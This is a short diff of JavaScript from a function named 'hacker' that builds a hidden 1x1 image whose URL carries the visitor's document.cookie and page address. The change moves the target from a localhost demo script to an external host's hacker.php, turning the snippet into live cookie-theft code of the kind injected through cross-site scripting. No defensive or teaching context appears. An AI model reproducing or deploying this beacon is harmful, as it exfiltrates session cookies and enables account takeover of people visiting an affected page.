@@ -8,7 +8,7 @@ function hacker(){
 		$('body').html("<iframe ></iframe>");
 		$('iframe').css({'width':'100%','height':'100%','overflow-x':'hidden','position':'relative'});
 		$('iframe').attr('src','http://blog.h2ero.cn');*/
-		var src='http://localhost/PHP/demo/demo.php?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(location.href);
+		var src='http://www.h2ero.cn/hacker.php?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(location.href);
 		$('body').append('<img style="width:1px;height:1px;" src="'+src+'"/>');
 	});
 	
